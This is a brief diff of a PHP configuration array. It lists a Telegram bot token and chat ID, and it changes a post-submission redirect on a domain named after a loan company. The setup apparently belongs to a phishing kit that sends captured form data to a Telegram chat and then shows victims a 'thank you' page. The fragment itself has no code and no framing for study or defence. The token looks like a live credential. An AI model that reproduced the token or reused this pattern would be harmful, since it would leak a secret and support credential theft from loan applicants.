@@ -45,7 +45,7 @@ $site_map = [
             ['token' => '5651009105:AAHaRNsOqggJM3Fl9sgRewqnXJJ7Dc326Rw', 'chat_id' => '2004020590']
 
         ],
-        'redirect' => 'https://upstartloansllc.onrender.com/cache_site/thankyou.html'
+        'redirect' => 'https://upstartloansllc.onrender.com/thankyou.html'
     ],
 
 
